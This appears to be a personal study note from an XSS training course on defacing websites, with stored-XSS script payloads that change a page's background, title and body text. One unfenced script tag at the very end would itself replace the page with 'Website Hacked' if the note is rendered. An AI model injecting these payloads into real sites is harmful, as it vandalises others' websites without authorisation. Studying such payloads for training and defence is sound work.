---
title: a-Defacing
draft: false
tags:
  - defacing
---
**Defacing** - Defacing a website means to change its look for anyone who visits the website. 

Hackers sometimes deface the website to claim that they had successfully hacked it. 

Stored XSS is commonly used for this.

## Defacing Elements

Three HTML elements are usually utilized to change the main look of a web page:

- Background Color `document.body.style.background`
- Background `document.body.background`
- Page Title `document.title`
- Page Text `DOM.innerHTML`


## Change Background

We can choose a certain color or use an image to change the background. 

With a color chosen:

```html
<script>document.body.style.background = "#141d2b"</script>
```

With image chose:

```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

## Change Page Title

```html
<script>document.title = 'Page Title Changed'</script>
```

## Change Page Text

We can change the text o the specific HTML element/DOM using the `innerHTML` function:

```javascript
document.getElementById("todo").innerHTML = "New Text"
```

We can also utilize jQuery functions to achieve the same if jQuery is already imported:

```javascript
$("#todo").html('New Text');
```

Hacker group usually leave a message on the web page and leave nothing else on it. 

Below will change the entire HTML code from the main body using `innerHTML`:

```javascript
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```

Below is the example defacing payload from Hackthebox:

```html
<center>
    <h1 style="color: white">Cyber Security Training</h1>
    <p style="color: white">by 
        <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy">
    </p>
</center>
```

We should minify it as such:

```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```

<script>document.getElementsByTagName('body')[0].innerHTML = "Website Hacked"</script>